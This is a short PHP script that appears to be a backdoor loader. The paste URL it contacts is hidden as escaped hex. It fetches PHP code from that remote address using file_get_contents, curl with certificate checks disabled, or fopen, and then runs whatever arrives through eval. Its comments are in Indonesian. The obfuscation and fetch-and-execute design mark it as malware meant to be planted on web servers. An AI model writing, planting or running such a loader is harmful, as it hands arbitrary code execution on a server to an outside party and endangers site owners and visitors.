<?php goto opet_95aaa; opet_95aaa: $hexUrl = "\x36\070\x37\064\x37\064\x37\060\x37\063\x33\101\x32\106\x32\106\x36\067\x36\070\x36\106\x37\063\x37\064\x36\062\x36\071\x36\105\x32\105\x36\061\x37\070\x36\065\x36\103\x32\105\x36\106\x37\062\x36\067\x32\106\x37\060\x36\061\x37\063\x37\064\x36\065\x32\106\x37\060\x37\066\x36\066\x37\067\x37\065\x32\106\x37\062\x36\061\x37\067";

function hex2str($hex) {
    $str = "";
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return $str;
}

function downloadPhpCode($url) {
    $data = false;

    if (ini_get("\x61\154\x6C\157\x77\137\x75\162\x6C\137\x66\157\x70\145\x6E")) {
        $data = @file_get_contents($url);
    }

    if (!$data && function_exists("\x63\165\x72\154\x5F\151\x6E\151\x74")) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
        ]);
        $data = curl_exec($ch);
        curl_close($ch);
    }

    if (!$data && ($fp = @fopen($url, "\x72"))) {
        $data = "";
        while (!feof($fp)) {
            $data .= fread($fp, 8192);
        }
        fclose($fp);
    }

    return $data;
}

// Decode & download
$url = hex2str($hexUrl);
$phpCode = downloadPhpCode($url);

// Eksekusi langsung via temporary eval
try {
    eval(" ?>".$phpCode);
} catch (Throwable $e) {
    echo "Error saat menjalankan kode: " . $e->getMessage();
}
?>
